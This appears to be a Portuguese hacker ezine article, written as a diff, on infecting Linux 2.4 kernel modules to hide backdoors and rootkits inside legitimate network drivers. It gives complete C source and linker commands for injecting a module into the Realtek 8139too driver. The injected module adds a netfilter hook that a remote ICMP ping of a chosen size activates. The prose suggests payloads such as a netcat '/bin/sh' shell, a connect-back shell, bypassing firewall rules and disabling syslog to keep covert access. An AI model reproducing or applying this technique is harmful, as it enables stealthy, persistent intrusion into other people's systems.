@@ -1,0 +1,692 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[04]-=[LKM Code Injection]=-|tDs|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+--=[ Introducao
+
+	Melhor que conseguir elevar  privilegios em um sistema e deixar um LKM 
+nosso, com backdoors, rootkits, ou o que for, e' colocar isso tudo em um LKM do
+sistema. Desta forma, a deteccao de rastros de uma intrusao fica um pouco mais
+dificil.
+
+	Neste pequeno texto, veremos de maneira clara (eu espero) como podemos
+infectar  um LKM,  adicionando mais funcoes ou modificando-as,  da maneira que
+acharmos uteis ao nossos objetivos.
+
+	O assunto pode parecer um pouco complexo para iniciantes, entretanto o
+que e' tratado e' somente o basico. Entao, se ja possui um conhecimento do as-
+sunto, e' mais proveitoso procurar por algo mais avancado para leitura. Conhe-
+cimento previo sobre a escrita de LKM e bem-vindo, embora nao seja indispensa-
+vel.  Exemplos e citacoes sao feitos  tendo em mente o kernel do GNU/linux, 
+2.4.x.
+
+
+
+--=[ O que sao LKMs
+
+	LKMs sao "pedacos" do kernel, que podem ser carregados e descarregados
+dinamicamente, aumentando (ou diminuindo) a gama de opcoes e funcionalidades que
+sao disponibilizadas pelo kernel do sistema. Por ser carregado sob demanda, ou
+seja, nao esta embutido no proprio kernel, LKMs tem diversas vantagens a codigo
+escritos diretamente no kernel. Entre elas temos:
+
+ - Economia de memoria: Pelo fato de ser carregada somente quando necessario,
+ nao existe desperdicio de memoria com funcoes que nao sao utilizadas constan-
+ temente;
+ - Facilidade na compilacao e debug: LKMs apos carregadas sao parte do kernel,
+ entretanto nao precisam ser compiladas junto com ele. Podem ser escritos e 
+ compilados a qualquer momento. Quando se tem problemas com o codigo, e' possi-
+ vel fazer um debug dele com facilidade muito maior do que se o codigo estives-
+ se embutido no kernel. E' mais rapido descarregar o modulo, modificar o codigo,
+ recompilar e recarregar o modulo do que reescrever a parte do codigo que esta
+ no kernel, recompilar tudo e reiniciar o computador!
+ - Novos drivers podem ser testados sem precisar reiniciar o sistema. E sao em
+ drivers que iremos nos concentrar.
+
+
+
+--=[ Inicio - Primeiros Exemplos
+
+	A forma mais simples de entender como funciona e' com exemplos. Inicial-
+mente,  criamos um modulo chamado driver_original.o,  que sera o exemplo usado
+como modulo do sistema, que futuramente sera infectado:
+
+<++> lkm_injection/driver_original.c
+/*
+ * Simples exemplo de um lkm que nao faz nada,
+ * mas poderia ser, por exemplo, um driver de
+ * uma placa de rede. 
+ * Compile com $gcc -O3 -c driver_original.c
+*/
+
+#define MODULE
+#define __KERNEL__
+    
+#include <linux/kernel.h>
+#include <linux/module.h>
+    
+static int __init inicio(void)
+{
+  printk ("<1> Iniciando driver_original \n");
+  printk ("<1> Executando funcoes iniciais\n");    
+  printk ("<1> Modulo carregado e aguardando chamada a suas funcoes\n\n");
+  return 0;
+}
+
+static void __exit fim(void)
+{
+  printk ("<1> Finalizando modulo orignal \n");
+}
+          
+module_init(inicio);
+module_exit(fim);
+MODULE_LICENSE("GPL");
+<--> lkm_injection/driver_original.c
+
+    
+	Antes de carregar o modulo,  e' interessante ter o syslogd funcionando 
+corretamente e com a seguinte linha no seu arquivo de configuracao (normalmente
+/etc/syslog.conf):
+
+    kern.alert   /var/log/alert
+
+Dessa forma poderemos observar melhor as mensagens que serao emitidas  pelo mo-
+dulo. Apos isso, compile o codigo e carregue o modulo:
+
+    #gcc -O3 -c driver_original.c
+    #insmod driver_original.o
+   
+    As opcoes passadas para o gcc sao:
+
+||  -O3: Optimize yet more.  -O3 turns on all optimizations specified 
+|| by -O2 and also turns on the -finline-functions and -frename-registers 
+|| options. (E' uma opcao para otimizacao do objeto criado pelo gcc.).
+||
+||  -c: Compile or assemble the source files, but do not link.  The linking 
+|| stage simply is not done. The ultimate output is in the form of an object 
+|| file for each source file.
+    
+    As seguintes mensagens devem aparecer em '/var/log/alert' (ou nao, elas 
+ainda podem aparecer em outro arquivo de log, sinistramente):
+
+    Nov 14 17:24:57 matrix kernel:  Iniciando driver_original
+    Nov 14 17:24:57 matrix kernel:  Executando funcoes iniciais
+    Nov 14 17:24:57 matrix kernel:  Modulo carregado e aguardando chamada a 
+    suas funcoes
+
+
+	Com o driver (pseudo-driver que faz absolutamente nada mais do que exi-
+bir mensagens) criado, podemos agora criar o modulo que contem o codigo que se-
+ra injetado no driver_original.o:
+
+<++> lkm_injection/infector.c
+/*
+ * Simples exemplo de modulo (note que tem apenas a funcao init_module, ou
+ * seja, so executa alguma funcao durante o carregamento dele), que sera 
+ * utilizado para ser injetado em um outro modulo.
+*/
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+int init_module(void)
+{
+  printk ("<1> Iniciando funcoes do modulo injetado\n");
+  return 0;
+}
+<-->lkm_injection/infector.c
+
+
+	Observe que o modulo anterior possui apenas uma funcao, a init_module.
+Essa funcao e' a equivalente a "main()" em um programa em C comum,  ou seja, e'
+a primeira funcao a ser executada na execucao do modulo, que no caso e' o car-
+regamento dele. Como deve imaginar, existe tambem uma funcao executada logo an-
+tes do descarregamento do modulo.  Essa funcao e' a "cleanup_module()".
+
+    Compile o codigo e carregue o modulo:
+    #gcc -O3 -c infector.c
+    #insmod infector.o
+
+    A seguinte mensagem deve aparecer em '/var/log/alert':
+
+    Nov 14 17:36:29 matrix kernel:  Iniciando funcoes do modulo injetado
+
+	Por enquanto, tudo que temos sao dois modulos separados (note que a uni-
+ca coisa que os modulos estao fazendo ate agora e' exibir mensagens no arquivo
+de log. Leve em conta o seguinte: 
+
+ - As funcoes do driver_original.o ja existem, como codigo do modulo do sistema
+que futuramente sera infectado. Poderiamos estar usando como exemplos o codigo
+de um driver real, mas isso apenas complicaria de forma desnecessaria a explana-
+cao de como podemos efetuar a infeccao;
+ - As nossas funcoes - backdoors, rootkits, etc - serao adicionadas em breve 
+(por voce, obvio, apenas sera mostrado que e' possivel fazer e como poderia
+ser feito).
+ 
+	Voltando ao que vale, o que precisamos fazer agora, e' injetar o modulo
+infector.o dentro do modulo driver_original.o. Para isso, podemos utilizar o
+GNU Linker (ld):
+
+||    "ld  combines  a  number of object and archive files, 
+||    relo­cates their data and ties up  symbol  references.  
+||    Usually the last step in compiling a program is to run 
+||    ld."
+
+	Para injetar o codigo do infector.o dentro do driver_original.o, podemos
+fazer da seguinte forma:
+
+    #ld -r -z muldefs infector.o driver_original.o -o devil.o
+
+	Basicamente o que e' feito aqui e' uma injecao da funcao 'int init_modu-
+le(void)' (a unica) do modulo infector.o para o modulo driver_original.o, crian-
+do um novo modulo, chamado devil.o. O codigo do driver_original.o deve ter fica-
+do parecido com o seguinte:
+
+/** driver_original_infectado */
+#define MODULE
+#define __KERNEL__
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+static int __init inicio(void)
+{
+  printk ("<1> Iniciando driver_original \n");
+  printk ("<1> Executando funcoes iniciais\n");    
+  printk ("<1> Modulo carregado e aguardando chamada a suas funcoes\n\n");
+  return 0;
+}
+
+static void __exit fim(void)
+{
+  printk ("<1> Finalizando modulo orignal \n");
+}
+          
+module_init(inicio);
+module_exit(fim);
+MODULE_LICENSE("GPL");
+
+int init_module(void)
+{
+  printk ("<1> Iniciando funcoes do modulo injetado\n");
+  return 0;
+}
+/** fim de driver_original_infectado */
+
+
+    Apos carregar ele (#insmod devil.o), o seguinte e' visto em '/var/log/alert':
+
+    Nov 14 18:34:42 matrix kernel:  Iniciando funcoes do modulo injetado
+
+	Esta funcionando, mas nao perfeitamente, ainda. Alguns detalhes devem
+ser observados. Um pouco de teoria:
+    
+	Em um LKM, a primeira funcao a ser executada e' a init_module() OU algu-
+ma funcao passada como argumento para a macro module_init() (que no caso do
+driver_original.c, foi a funcao 'inicio'). A macro module_init() esta declarada
+em '/usr/src/linux/include/linux/init.h':
+
+|| /**
+||  * module_init() - driver initialization entry point
+||  * @x: function to be run at kernel boot time or module insertion
+||  *
+||  * module_init() will add the driver initialization routine in
+||  * the "__initcall.int" code segment if the driver is checked as
+||  * "y" or static, or else it will wrap the driver initialization
+||  * routine with init_module() which is used by insmod and
+||  * modprobe when the driver is used as a module.
+|| */
+|| #define module_init(x)  __initcall(x);
+
+    Se observar, vera que no codigo teria tanto a funcao "module_init" quanto
+a "init_module". Entao, caso o codigo acima fosse compilado, ocorreria um erro:
+
+    error: redefinition of `init_module'
+    error: `init_module' previously defined here
+
+	O mesmo ocorreria se eles fossem  compilados separados e  posteriomente
+linkados. Para contornar este problema, compilamos os arquivos separadamentes e
+linkamos,  passando o argumento '-z muldefs' para o ld,  informando a ele para
+aceitar definicoes multiplas de uma mesma funcao. Desta forma podemos substituir
+(sobreescrever) a funcao 'module_init(inicio)', que inicializa o driver_original
+.o, pela funcao init_module() do modulo infector.o.  
+
+	Dessa forma teriamos o nosso modulo injetado dentro do modulo que esta-
+mos tentando infectar. So tem um detalhe: A funcao 'module_init(inicio)' que se-
+ra sobreescrita contem codigo que pode ser essencial para o modulo, em sua ver-
+sao nao infectada (aqui o codigo original apenas exibe mensagens, mas normalmen-
+te nao e' apenas isso que ocorre), e deve continuar sendo executado.  Para que
+tudo funcione corretamente, basta que o modulo infector.o, em sua inicializacao,
+execute uma chamada para a funcao inicio() do modulo driver_original.o. 
+Complicou? Observe:
+
+<++> lkm_injection/infector2.c
+/*
+ * Simples exemplo de modulo (note que tem apenas a funcao init_module, ou
+ * seja, so executa alguma funcao durante o carregamento dele), que sera
+ * utilizado para ser injetado em um outro modulo. Apos carregado, executa funcao
+ * principal do modulo infectado
+ */
+#define MODULE
+#define __KERNEL__
+    
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+int init_module(void)
+{
+  printk ("<1> Iniciando funcoes do modulo injetado\n");
+  printk ("<1> ***inicializando modulo original*** \n\n");
+  inicio (); // funcao inicio do driver_original, chamada para 
+             // inicializacao dele
+  return 0;
+}
+<--> lkm_injection/infector2.c
+
+Compilamos o novo modulo e linkamos com o modulo original, criando um outro 
+modulo, chamado devil.o:
+
+    # gcc -O3 -c infector2.c
+    # ld -r -z muldefs infector2.o driver_original.o -o devil.o
+    
+    Apos carregar o modulo (#rmmod devil; insmod devil.o), vemos o seguinte em
+    '/var/log/alert':
+
+    Nov 14 18:39:24 matrix kernel:  Iniciando funcoes do modulo injetado
+    Nov 14 18:39:24 matrix kernel:  ***inicializando modulo original*** 
+    Nov 14 18:39:24 matrix kernel:  Iniciando driver_original 
+    Nov 14 18:39:24 matrix kernel:  Executando funcoes iniciais
+    Nov 14 18:39:24 matrix kernel:  Modulo carregado e aguardando chamada a
+suas funcoes
+
+    Exatamente o que e' necessario:
+ - Nosso modulo e' executado, fazendo o que precisa;
+ - Nosso modulo chama a funcao original do modulo que foi infectado;
+ - Modulo original funciona normalmente, como se nada tivesse acontecido.
+    So precisamos de algum codigo util para ser executado e algum modulo para 
+servir de hospedeiro!
+
+
+
+--=[ Localizando o Hospedeiro
+
+	Como dito anteriormente, a primeira funcao a ser executada em um modulo
+pode ser tanto module_init(FUNCAO), quanto  init_module(). No caso da infeccao
+de um modulo que seja inicializado por  module_init(FUNCAO), so precisamos nos
+certificar que o codigo que infectou o modulo original faca uma chamada para
+'FUNCAO', garantindo assim que tudo que deve ser executado por ele ao ser car-
+regado realmente sera executado. Agora, no caso da infeccao de um modulo que e'
+inicializado por init_module(), a situacao e' diferente. E' necessario literal-
+mente reescrever o init_module() do modulo original dentro do  modulo que  ira 
+causar a  infeccao. Isto  pode  ser  um  tanto chato de se fazer, dependendo do 
+tamanho da funcao de inicializacao. Por este simples motivo, sera dado preferen-
+cia aos modulos que sejam inicializados por module_init(FUNCAO).
+
+	Decidir qual modulo utilizar nao deve ser uma tarefa muito complicada.
+Vamos levar em consideracao o seguinte:
+
+ - Para que possamos acessar uma maquina remota, ela obviamente esta conectada
+a rede atraves de algum dispositivo, que normalmente e' uma interface de rede 
+(ethernet);
+ - Para que a interface de rede possa ser utilizada, e' necessaria a utilizacao
+de algum tipo de driver;
+ - A maioria das distribuicoes de linux atualmente, colocam os drivers de
+interfaces de rede como modulos;
+
+	Com estas informacoes, conclui-se que e' bastante interessante a infec-
+cao de um driver de interface de rede (se a maquina nao carregar este modulo a
+cada inicializacao do sistema,  ela nao tera  acesso a rede e nos nao teremos
+acesso a ela de qualquer forma, por isso a escolha).
+
+	Outro detalhe que vale observar e' que muitas maquinas costumam utilizar
+placas de rede comuns (realtek, sis900, 3com), assim utilizam os mesmos modulos
+(sistemas diferentes utilizando modulos iguais), o que facilitaria bastante a
+escrita de nosso codigo de infeccao. Vamos dar uma observada no codigo destes
+modulos controladores de dispositivos de rede:
+
+
+|| /** realtek 8139 */
+|| /*
+||   8139too.c: A RealTek RTL-8139 Fast Ethernet driver for Linux.
+||    Maintained by Jeff Garzik <jgarzik@pobox.com>
+||   Copyright 2000-2002 Jeff Garzik
+|| */
+|| ...
+|| muito codigo
+|| ...
+|| module_init(rtl8139_init_module);
+|| module_exit(rtl8139_cleanup_module);
+|| /** fim de realtek 8139 */
+
+
+|| /** sis900 */
+|| /* sis900.c: A SiS 900/7016 PCI Fast Ethernet driver for Linux.
+||    Copyright 1999 Silicon Integrated System Corporation 
+||    Revision: 1.08.06 Sep. 24 2002
+||        
+||    Modified from the driver which is originally written by Donald Becker.
+|| */
+|| ...
+|| muito codigo
+|| ...
+|| module_init(sis900_init_module);
+|| module_exit(sis900_cleanup_module);
+|| /** fim de sis900 */
+
+
+|| /** ne2k */
+|| /* ne2k-pci.c: A NE2000 clone on PCI bus driver for Linux. */
+|| /*
+||  A Linux device driver for PCI NE2000 clones.
+|| */
+|| ...
+|| muito codigo
+|| ...
+|| module_init(ne2k_pci_init);
+|| module_exit(ne2k_pci_cleanup);
+|| /** ne2k */
+
+
+	O codigo completo dos arquivos esta em '/usr/src/linux/drivers/net'.
+Nota alguma semelhanca entre o codigo desses drivers e o codigo do 
+"driver_original.c"? Observa-se que muitos destes drivers estao codificados de
+forma a facilitar o nosso trabalho. Tendo entao alguns hospedeiros selecionados,
+vamos juntar alguns codigos interessantes para injetar neles.
+
+
+
+--=[ Colocando Algum Codigo Util
+
+    Agora que ja sabemos como fazer, precisamos decidir o que fazer. Algumas
+ideias:
+
+ - Uma backdoor;
+ - Um logcleanner;
+ - Um rootkit;
+ - Um sninffer;
+ - Qualquer coisa que voce tiver ideia! Voce esta no comando.
+ 
+	Com as ferramentas em maos, vamos ver uma pseudo-implementacao de algum
+codigo realmente util. O codigo a seguir e' uma LKM que contem um codigo inofen-
+sivo, ate que o kernel manipule um pacote ICMP de 50 bytes (em outras palavras,
+o codigo nocivo da LKM e' ativado por um PING remoto de 50 bytes, que pode ser
+feito assim: $ping -s 22 ip.da.vitima). Isso e' feito com a criacao de um hook
+no netfilter, que e' adicionado antes de outras possiveis regras que  poderiam
+ter sido criadas para bloquear pacotes ICMP, ou seja, voce pode com isso passar
+por um conjunto de regras que tornaria a vitima inacessivel. E mais, voce pode
+criar regras on-the-fly,  para permitir que a maquina que enviou o pacote ICMP
+tenha acesso irrestrito. Resumindo, voce pode inutilizar as regras que tenham
+sido criadas. 
+
+	Para execucao, e' possivel colocar o que quiser: uma backdoor (que tal
+executar o netcat ouvindo em uma porta X e passar a opcao "-e /bin/sh" para ele?
+Uma root shell sem muito esforco), uma backdoor em connect-back  (que tal esse
+mesmo netcat se conectar no ip de quem enviou o pacote ICMP), desativar o syslo-
+gd enquanto o ip de quem enviou o pacote  ICMP estiver se comunicando com a ma-
+quina, etc. Observe que, se receber 50 pacotes do tamanho especifico, o codigo
+nocivo sera executado 50 vezes, o que nao sera bom na maioria dos casos.  No
+exemplo, apenas exibe uma mensagem, entao nao teremos problemas. Tenha isso em
+mente no momento que for implementar algo e controle a execucao do codigo noci-
+vo. Segue a implementacao:
+
+
+
+<++> lkm_injection/injekt.c
+/*
+ * Implementacao de lkm com codigo nocivo ativado remotamente,
+ * atraves do recebimento de um pacote ICMP de 50 bytes, que pode
+ * ser alterado passando o parametro pkt_size: 
+ * #insmod injekt.o pkt_size=100
+ *
+ */
+#define __KERNEL__
+#define MODULE
+
+#define P_SIZE_OFFSET 28
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/ip.h>
+#include <linux/net.h>
+#include <linux/in.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/netdevice.h>
+
+/* declaracoes de variaveis e prototipo de funcoes  */
+int exec_injetk(void);
+unsigned int pkt_size = 22;
+struct nf_hook_ops nfh;
+unsigned int i_ll_hook_you(unsigned int hooknum,
+                            struct sk_buff **skb,
+                            const struct net_device *in,
+                            const struct net_device *out,
+                            int (*okfn)(struct sk_buff*));
+
+
+
+/* funcao principal do modulo */
+int __init init_injekt()
+{
+    printk ( "<1> Inicializando : icmp_pkt_size:  " \
+                 "%i bytes\n\n", pkt_size + P_SIZE_OFFSET);
+
+    /* informacoes para registrar o hook do netfilter */
+    nfh.hooknum  = NF_IP_LOCAL_IN;
+    nfh.priority = NF_IP_PRI_FIRST;
+    nfh.hook     = i_ll_hook_you;
+    nfh.pf       = PF_INET;
+
+    /* a hook e' criada */
+    nf_register_hook(&nfh);
+    
+    return 0;
+}
+
+
+
+/* funcao de saida do modulo */
+void __exit exit_injekt ( )
+{
+    /* remove a hook */    
+    nf_unregister_hook( &nfh );
+}
+
+
+/* O que sera feito quando receber o pacote ICMP do tamanho especificado  */
+int i_am_terrible( )
+{
+    printk ( "<1> EU SOU UMA LKM DO MAU!!!\n\n" );
+    return 0;
+}
+
+
+/* aqui temos a hook propriamente dita */
+unsigned int i_ll_hook_you ( 
+		    unsigned int hooknum,
+                    struct sk_buff **skb,
+                    const struct net_device *in,
+                    const struct net_device *out,
+                    int (*okfn)(struct sk_buff * ) ) {
+
+    struct sk_buff *sk = *skb;
+    /* verifica se o protocolo e' icmp e o tamanho do pacote e' o especificado */
+    if ( sk->nh.iph->protocol == IPPROTO_ICMP &&
+         sk->len == P_SIZE_OFFSET + pkt_size ) {
+        /* informa que recebeu o pacote */
+	//printk ( "<1> Recebido pacote de %i bytes )\n\n", sk->len );
+	i_am_terrible();
+	return NF_STOLEN; /* elimina o pacote! */
+    }
+    return NF_ACCEPT; /* retorna o pacote para ser feito o que for preciso */
+}
+
+/* informacoes do modulo */
+module_init ( init_injekt );
+module_exit ( exit_injekt );
+MODULE_PARM ( pkt_size, "i" );
+MODULE_PARM_DESC ( pkt_size, "Tamanho de pacote ICMP  ( Padrao = 50 )" );
+MODULE_LICENSE ( "GPL" );
+MODULE_AUTHOR  ( "tDs <tds@motdlabs.org>" );
+MODULE_DESCRIPTION ( ":: keep your mind free() ::" );
+<--> lkm_injection/injekt.c
+
+
+
+--=[ Cenario Real: Infectando um Driver
+
+	Vamos utilizar como exemplo o driver 8139too.o, que normalmente esta em
+"/lib/module/kernel_versao/kernel/drivers/net/8139too.o.gz". Note que ele esta
+compactado (na maioria das distribuicoes),  entao nao tente injetar seu modulo
+sem antes descompactar.  O codigo que sera injetado e' o que foi exposto acima,
+levemente modificado (embora continue fazendo nada mais do que exibir mensagens).
+Segue o codigo:
+
+<++>lkm_injection/8139injekt.c
+/*
+ * Implementacao de lkm com codigo nocivo ativado remotamente,
+ * atraves do recebimento de um pacote ICMP de 50 bytes, que pode
+ * ser alterado passando o parametro pkt_size: 
+ * #insmod 8139injekt.o pkt_size=100
+ * preparado para infectar driver da placa de rede realtek 8139too
+ * /lib/modules/2.4.x/kernel/drivers/net/8139too.o.gz
+ *
+ */
+#define __KERNEL__
+#define MODULE
+
+#define P_SIZE_OFFSET 28
+
+#include <linux/config.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/ip.h>
+#include <linux/net.h>
+#include <linux/in.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/netdevice.h>
+#include <linux/pci.h>
+
+int exec_injetk(void);
+extern RTL8139_DRIVER_NAME;
+extern rtl8139_pci_driver;
+//extern pci_module_init();
+unsigned int pkt_size = 22;
+struct nf_hook_ops nfh;
+unsigned int i_ll_hook_you(unsigned int hooknum,
+                            struct sk_buff **skb,
+                            const struct net_device *in,
+                            const struct net_device *out,
+                            int (*okfn)(struct sk_buff*));
+
+int init_module()
+{
+	/* codigo do driver original */
+        /* when we're a module, we always print a version message,
+         * even if no 8139 board is found.
+         */
+#ifdef MODULE
+        printk("<8> %s \n", RTL8139_DRIVER_NAME);
+#endif
+
+
+    nfh.hooknum  = NF_IP_LOCAL_IN;
+    nfh.priority = NF_IP_PRI_FIRST;
+    nfh.hook     = i_ll_hook_you;
+    nfh.pf       = PF_INET;
+    nf_register_hook(&nfh);
+    
+    /* codigo do driver original */
+    return pci_module_init(&rtl8139_pci_driver);
+}
+
+void cleanup_module ( )
+{
+    /* remove a hook */
+    nf_unregister_hook( &nfh );
+    /* codigo do driver original */
+    pci_unregister_driver(&rtl8139_pci_driver);
+}
+int i_am_terrible( )
+{
+    printk ( "<1> EU SOU UMA LKM DO MAU!!!\n\n" );
+    return 0;
+}
+unsigned int i_ll_hook_you ( 
+		    unsigned int hooknum,
+                    struct sk_buff **skb,
+                    const struct net_device *in,
+                    const struct net_device *out,
+                    int (*okfn)(struct sk_buff * ) ) {
+    struct sk_buff *sk = *skb;
+    if ( sk->nh.iph->protocol == IPPROTO_ICMP &&
+         sk->len == P_SIZE_OFFSET + pkt_size ) {
+	i_am_terrible();
+	return NF_STOLEN;
+    }
+    return NF_ACCEPT;
+}
+MODULE_PARM ( pkt_size, "i" );
+MODULE_PARM_DESC ( pkt_size, "Tamanho de pacote ICMP  ( Padrao = 50 )" );
+<-->lkm_injection/8139injekt.c
+
+
+    Compile e linke o modulo. Apos linkar, sera exibida uma mensagem de 
+advertencia:
+
+    # gcc -O3 -c 8139injekt.c
+    # ld -r -z muldefs 8139inject.o 8139too.o -o devil.o
+    ld: Warning: size of symbol `init_module' changed from 139 in badcode.o 
+    to 70 in 8139too.o
+    ld: Warning: size of symbol `cleanup_module' changed from 32 in badcode.o 
+    to 12 in 8139too.o
+    # modinfo devil.o
+    filename:    devil.o
+    description: "RealTek RTL-8139 Fast Ethernet driver"
+    author:      "Jeff Garzik <jgarzik@pobox.com>"
+    license:     "GPL"
+    parm:        pkt_size int, description "Tamanho de pacote ICMP  
+                 ( Padrao = 50 )"
+    parm:        multicast_filter_limit int, description "8139too maximum number
+                 of filtered multicast addresses"
+    parm:        max_interrupt_work int, description "8139too maximum events 
+                 handled per interrupt"
+    parm:        media int array (min = 1, max = 8), description "8139too: Bits
+                 4+9: force full duplex, bit 5: 100Mbps"
+    parm:        full_duplex int array (min = 1, max = 8), description "8139too:
+                 Force full duplex for board(s) (1)"
+    parm:        debug int, description "8139too bitmapped message enable number"
+
+    
+	Observe que o modulo agora contem o parametro que definimos anteriormen-
+te, em nosso modulo. Apos carregar o modulo, o hook do netfilter que foi criada
+estara disponivel e, para ativar a nossa funcao "i_am_terrible", basta um 
+"ping -s 22 ip.da.vitima". Note que o PING nao vai retornar resposta, visto que
+o pacote sera descartado no hook. Entretanto, funcionara perfeitamente. Ultima
+observacao: Nao tente fazer isso com um driver de um dispositivo nao presente
+na maquina, os resultados podem ser desastrosos ( panic() ).
+
+	Muito pode ser feito com infeccao de modulo, embora pessoas com maior 
+conhecimento normalmente utilizam-se de outros meios para manter acesso em
+hosts previamente dominados. A utilizacao de modulos para esse fim pode ser
+bastante efetiva e ao mesmo tempo muito simples de ser implemtentada.
+
+
+--=[ Agradecimentos e Links/Referencias
+
+	Pessoal da scene brasileira toda, em especial ao pessoal que converso
+com maior frequencia. Voces sabem quem sao voces.
+    Informacao e' simples de se adquirir, internet esta cheia disso. Basta saber
+procurar.
+
+http://www.motdlabs.org
+http://tds.motdlabs.org
+http://gcc.gnu.org/onlinedocs/gcc-3.4.4/gcc/
+http://www.gnu.org/software/binutils/manual/ld-2.9.1/html_chapter/ld_toc.html
+http://www.netfilter.org/
+
+_EOF_
